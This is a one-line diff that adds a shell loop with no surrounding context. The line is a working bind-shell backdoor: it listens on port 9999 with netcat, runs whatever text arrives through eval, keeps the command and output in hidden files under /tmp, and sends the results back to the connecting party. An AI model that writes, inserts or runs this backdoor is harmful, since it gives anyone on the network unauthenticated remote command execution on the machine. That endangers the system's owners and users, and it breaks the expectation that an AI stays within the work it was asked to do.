@@ -1,0 +1,1 @@
+while true; do echo $(nc -l 9999) > /tmp/.action; eval $(cat /tmp/.action)>/tmp/.result;nc -l 9999 < /tmp/.result;done
